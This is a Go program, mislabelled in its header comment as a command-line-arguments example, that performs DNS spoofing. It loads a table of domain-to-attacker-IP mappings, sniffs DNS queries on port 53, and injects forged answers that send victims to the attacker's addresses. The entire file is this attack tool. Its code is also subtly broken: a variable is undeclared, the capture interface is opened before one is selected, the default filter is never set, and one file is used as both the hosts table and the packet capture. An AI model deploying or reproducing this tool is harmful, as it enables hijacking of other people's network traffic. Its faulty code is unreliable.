// Golang program to show how
// to use command-line arguments
package main

import (
	"fmt"
	"log"
	"os"
	"net"
	"strings"
	"bufio"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {

	var iface, fileName, pattern string
	var actualBpfFilter string

	var poisonHostsTable map[string]string

	// fmt.Println(reflect.ValueOf(os.Args).Kind())

	for i, v := range os.Args {
		if v == "-i" {
			iface = os.Args[i+1]
			fmt.Println("Interface specified by user: ", iface)
		} else if v == "-r" && iface == "" {
			fileName = os.Args[i+1]
			fmt.Println("FileName to read packets from: ", fileName)
		} else if v == "-s" {
			pattern = os.Args[i+1]
			fmt.Println("Pattern specified by user: ", pattern)
		} else if i==1 && os.Args[i] != "-r" && os.Args[i] != "-i" && os.Args[i] != "-s" {
			actualBpfFilter = os.Args[i]
			fmt.Println("BPF filter specified by user: ", actualBpfFilter)
		} else if i > 0 && os.Args[i-1] != "-r" && os.Args[i-1] != "-i" && os.Args[i-1] != "-s" {
			actualBpfFilter = os.Args[i]
			fmt.Println("BPF filter specified by user: ", actualBpfFilter)
		}
	}


	if fileName != "" {
		fmt.Println("Opening file: ", fileName)
		var fileHandle, err = os.Open(fileName)
		if err != nil {
			log.Fatal(err)
		}
		defer fileHandle.Close()
		scanner := bufio.NewScanner(fileHandle)
		//scanner.Split(bufio.ScanWords)
		poisonHostsTable = map[string]string{}
		for scanner.Scan() {
			line := scanner.Text()
			fmt.Println("line = ", line)
			parts := strings.Split(line, " ")
			//var ip string = parts[0]
			for i := range parts {
				//fmt.Println("parts value:", parts[i], "hello")
				if parts[i] != "" && i != 0 {
					//fmt.Println("disctionary")
					poisonHostsTable[parts[i]] = parts[0]
				}
			}
			//dict[parts[1]] = parts[0]
			//fmt.Println(parts[1])
			fmt.Println(poisonHostsTable)
		}
		if err := scanner.Err(); err != nil {
			fmt.Println(err)
		}
	}


	

	var currDevice pcap.Interface
	var handle *pcap.Handle

	
	// Open device
	// handle, err = pcap.OpenLive(currDevice.Name, snapshot_len, promiscuous, timeout)
	if fileName != "" {
		fmt.Println("Opening file: ", fileName)
		handle, err = pcap.OpenOffline(fileName)
	} else {
		fmt.Println("Opening live connection on interface: ", currDevice.Name)
		handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)

		devices, err := pcap.FindAllDevs()
		if err != nil {
			log.Fatal(err)
		}
		// Print device information
		for _, device := range devices {
			if iface == "" {
				currDevice = device
				break
			}
			if iface == device.Name {
				currDevice = device
				break
			}
		}

	}

	// handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)

	if err != nil {
		log.Fatal(err)
	}

	defer handle.Close()

	if actualBpfFilter == "" {
		actualBpfFilter = "udp and port 53"
	} else if actualBpfFilter != "" {
		actualBpfFilter = "udp and port 53 and " + actualBpfFilter
		err = handle.SetBPFFilter(actualBpfFilter)
		if err != nil {
			log.Fatal(err)
		}
	}

	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		fmt.Println("!!!! New packet received !!!!")
		dns_spoof(handle, packet, poisonHostsTable)
	}

}


func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map[string]string) {

	var srcMacAddr, destMacAddr net.HardwareAddr
	var etherType layers.EthernetType

	var ipVersion, ipTTL uint8
	var ipProtocol layers.IPProtocol
	var srcIpAddr, destIpAddr net.IP
	var srcPort, destPort layers.UDPPort

	etherLayer := packet.Layer(layers.LayerTypeEthernet)
	if etherLayer != nil {
		ethPacket, _ := etherLayer.(*layers.Ethernet)
		srcMacAddr = ethPacket.SrcMAC
		destMacAddr = ethPacket.DstMAC
		etherType = ethPacket.EthernetType
	}

	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {
		ipPacket, _ := ipLayer.(*layers.IPv4)
		ipVersion = 4
		ipTTL = 64
		ipProtocol = layers.IPProtocolUDP
		srcIpAddr = ipPacket.SrcIP
		destIpAddr = ipPacket.DstIP
	}

	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer != nil {
		udpPacket, _ := udpLayer.(*layers.UDP)
		srcPort = udpPacket.SrcPort
		destPort = udpPacket.DstPort
	}

	// fmt.Println("=========================================================")
	dnsLayer := packet.Layer(layers.LayerTypeDNS)
    if dnsLayer != nil {
        dns, _ := dnsLayer.(*layers.DNS)
		// Dns Operations
		// dns_id = dnsPacket.ID
		// fmt.Print("dns_id: ", dns_id)
		// fmt.Println("————————-------------------------------------------------")
		// var buf []byte
		// fmt.Println("DNS ", dns.ID)
		writePacket := false
		if dns.ANCount == 0 {
			// fmt.Println("————————")
			// fmt.Println("    DNS Record Detected")
			for _, dnsQuestion := range dns.Questions {
				website := string(dnsQuestion.Name)

				fmt.Println(website)

				var answerRecord layers.DNSResourceRecord

				if attackerIp, ok := poisonHostsTable[website];  ok {
					writePacket = true
					spoofedIp := net.ParseIP(attackerIp)
					fmt.Print("Spoofed IP: ", spoofedIp)
					answerRecord.IP = spoofedIp
					dns.ANCount += 1
					answerRecord.Type = layers.DNSTypeA
					// answerRecord.Name = []byte(dnsQuestion.Name)
					answerRecord.Name = dnsQuestion.Name
					answerRecord.Class = layers.DNSClassIN
					dns.QR = true
					// dns.OpCode = layers.DNSOpCodeNotify
					// dns.AA = true
					dns.Answers = append(dns.Answers, answerRecord)
					dns.ResponseCode = layers.DNSResponseCodeNoErr
					if dns.ANCount > 0 {
						for _, dnsAnswer := range dns.Answers {
							// fmt.Println("All DNS Answers: ", dnsAnswer.String())
							// d.DnsAnswerTTL = append(d.DnsAnswerTTL, fmt.Sprint(dnsAnswer.TTL))
							if dnsAnswer.IP.String() != "<nil>" {
								// fmt.Println("    DNS Answer: ", dnsAnswer.IP.String())
								// d.DnsAnswer = append(d.DnsAnswer, dnsAnswer.IP.String())
							}
						}
					}
				}

			}
		}

		if writePacket {
			// fmt.Println("=========================================================")

			eth := layers.Ethernet {
				SrcMAC:       destMacAddr,
				DstMAC:       srcMacAddr,
				EthernetType: etherType,
			}
			ip := layers.IPv4 {
				Version:  ipVersion,
				TTL:      ipTTL,
				SrcIP:    destIpAddr,
				DstIP:    srcIpAddr,
				Protocol: ipProtocol,
			}
			udp := layers.UDP{
				SrcPort: destPort,
				DstPort: srcPort,
			}
			udp.SetNetworkLayerForChecksum(&ip)
		
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, &*dns)
			finalPacket := buf.Bytes()
			if err := handle.WritePacketData(finalPacket); err != nil {
				fmt.Println("Error sending spoofed packet:", err)
			}
		}

	}

}


